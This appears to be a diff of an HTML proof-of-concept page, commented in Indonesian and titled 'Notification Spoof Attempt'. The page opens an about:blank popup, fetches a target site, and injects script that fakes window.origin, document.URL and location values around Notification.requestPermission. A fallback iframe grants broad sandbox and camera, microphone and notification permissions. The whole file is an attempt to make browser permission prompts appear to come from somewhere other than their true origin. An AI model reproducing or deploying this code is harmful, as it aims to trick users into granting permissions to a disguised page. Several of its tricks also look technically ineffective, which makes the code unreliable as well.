@@ -1,144 +1,84 @@
 <!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <title>Open about:blank Popup with Spoofed Origin</title>
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        padding: 20px;
-      }
-    </style>
-  </head>
-  <body>
-    <button onclick="openSpoofedPopup()">Open Popup (Spoof Origin)</button>
-
-    <script>
-      async function openSpoofedPopup() {
-        const targetUrl = "https://permission.site"; // ganti sesuai kebutuhan
-
-        // Buka popup dengan about:blank
-        const win = window.open(
-          "about:blank",
-          "_blank",
-          "width=800,height=600,left=200,top=100,resizable=yes,scrollbars=yes"
-        );
-
-        if (!win) {
-          alert("Popup diblokir oleh browser. Izinkan popup untuk situs ini.");
-          return;
-        }
-
-        try {
-          // Fetch konten target
-          const response = await fetch(targetUrl);
-          if (!response.ok) throw new Error(`HTTP ${response.status}`);
-
-          let html = await response.text();
-
-          // 1. Ganti semua referensi origin ke about:blank
-          // 2. Hapus tag <base> jika ada, atau set ke about:blank
-          // 3. Tambah script untuk spoof origin saat permission request
-
-          html = html.replace(
-            /<head>/i,
-            `<head>
-              <base href="${targetUrl}/">
-              <script>
-                // Spoof origin untuk Permission API
-                (function() {
-                  const originalRequestPermission = Notification.requestPermission;
-                  Notification.requestPermission = async function(...args) {
-                    const result = await originalRequestPermission.apply(this, args);
-                    // Override get origin agar selalu about:blank
-                    Object.defineProperty(window, 'origin', {
-                      get: () => 'null',
-                      configurable: true
-                    });
-                    Object.defineProperty(document, 'URL', {
-                      get: () => 'about:blank',
-                      configurable: true
-                    });
-                    return result;
-                  };
-
-                  // Override beberapa method lain yang sering digunakan
-                  const originalGet = window.location.__lookupGetter__('origin') ||
-                                     window.location.__lookupGetter__('href');
-                  if (originalGet) {
-                    Object.defineProperty(window.location, 'origin', {
-                      get: () => 'null',
-                      configurable: true
-                    });
-                    Object.defineProperty(window.location, 'href', {
-                      get: () => 'about:blank',
-                      configurable: true
-                    });
-                  }
-
-                  // Blokir akses ke parent origin
-                  window.__proto__ = null;
-                })();
-              <\/script>`
-          );
-
-          // Tambah style fullscreen
-          html = html.replace(
-            /<\/head>/i,
-            `<style>
-              body, html {
-                margin:0;
-                padding:0;
-                height:100%;
-                overflow:hidden;
-                background:#000;
-              }
-            </style>
-            </head>`
-          );
-
-          // Inject konten ke popup
-          win.document.open();
-          win.document.write(html);
-          win.document.close();
-
-          console.log("✅ Berhasil inject HTML dengan spoof origin");
-        } catch (error) {
-          console.warn("⚠️ Fetch gagal:", error.message);
-
-          // Fallback menggunakan iframe + spoof origin
-          win.document.open();
-          win.document.write(`
-<!DOCTYPE html>
-<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>about:blank</title>
-  <base href="${targetUrl}/">
-  <style>
-    body, html { margin:0; padding:0; height:100%; overflow:hidden; }
-    iframe { border:none; width:100%; height:100%; display:block; }
-  </style>
-  <script>
-    // Spoof origin di level popup
-    Object.defineProperty(window, 'origin', { get: () => 'null', configurable: true });
-    Object.defineProperty(document, 'URL', { get: () => 'about:blank', configurable: true });
-  <\/script>
+  <meta charset="UTF-8" />
+  <title>Notification Spoof Attempt</title>
+  <style>body { font-family: Arial; padding: 20px; }</style>
 </head>
 <body>
-  <iframe
-    src="${targetUrl}"
-    sandbox="allow-scripts allow-forms allow-modals allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-top-navigation-by-user-activation"
-    allow="geolocation; microphone; camera; notifications; clipboard-write; clipboard-read">
+  <button onclick="openSpoofedPopup()">Open Popup</button>
+
+  <script>
+    async function openSpoofedPopup() {
+      const targetUrl = "https://permission.site";
+
+      // Cara 1: Popup about:blank + inject + spoof (versi agresif)
+      const win = window.open("about:blank", "_blank", "width=800,height=600,resizable=yes");
+
+      if (!win) return alert("Popup diblokir");
+
+      try {
+        const res = await fetch(targetUrl);
+        let html = await res.text();
+
+        // Hapus semua base & script yang mungkin override
+        html = html.replace(/<base[^>]*>/gi, '');
+        html = html.replace(/<script[^>]*>([\s\S]*?)<\/script>/gi, (m) => {
+          if (m.includes('location.origin') || m.includes('document.URL')) return '';
+          return m;
+        });
+
+        // Inject script spoofing lebih awal
+        const spoofScript = `
+          <script>
+            Object.defineProperty(window, 'origin', {get: () => 'null', configurable: false});
+            Object.defineProperty(document, 'URL', {get: () => 'about:blank', configurable: false});
+            Object.defineProperty(location, 'origin', {get: () => 'null', configurable: false});
+            Object.defineProperty(location, 'href', {get: () => 'about:blank', configurable: false});
+            // Coba blokir akses ke parent
+            try { window.top = window.self; } catch(e) {}
+            // Coba override Permission API
+            const origReq = Notification.requestPermission;
+            Notification.requestPermission = function() {
+              return origReq.apply(this, arguments);
+            };
+            // Coba force null origin
+            window.__proto__ = null;
+            document.__proto__ = null;
+          <\/script>
+        `;
+
+        html = html.replace(/<head>/i, `<head>${spoofScript}<base href="${targetUrl}/">`);
+
+        win.document.open();
+        win.document.write(html);
+        win.document.close();
+      } catch (e) {
+        console.error(e);
+
+        // Cara 2: Iframe sandbox dengan allow-same-origin (tapi origin tetap)
+        win.document.open();
+        win.document.write(`
+<!DOCTYPE html>
+<html>
+<head>
+  <title>about:blank</title>
+  <base href="${targetUrl}/">
+  <script>
+    Object.defineProperty(window, 'origin', {get: () => 'null'});
+    Object.defineProperty(location, 'origin', {get: () => 'null'});
+  <\/script>
+</head>
+<body style="margin:0;">
+  <iframe src="${targetUrl}" style="border:none;width:100vw;height:100vh;"
+    sandbox="allow-scripts allow-same-origin allow-modals allow-popups allow-forms allow-top-navigation allow-storage-access-by-user-activation"
+    allow="notifications; microphone; camera; geolocation">
   </iframe>
 </body>
-</html>
-          `);
-          win.document.close();
-
-          console.log("✅ Fallback iframe dengan spoof origin");
-        }
+</html>`);
+        win.document.close();
       }
-    </script>
-  </body>
+    }
+  </script>
+</body>
 </html>
